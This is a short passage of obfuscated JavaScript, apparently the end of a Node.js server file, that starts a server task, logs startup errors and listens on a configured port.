AddVisitTask();}catch(_0x50e561){console[_0xe3c878(0x1c6)]('Error\x20in\x20startserver:',_0x50e561);}}startserver()['catch'](_0x2d5bfe=>{const _0x454289=_0x573ec6;console[_0x454289(0x1c6)](_0x454289(0x194),_0x2d5bfe);}),app[_0x573ec6(0x216)](PORT,()=>console[_0x573ec6(0x1cd)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
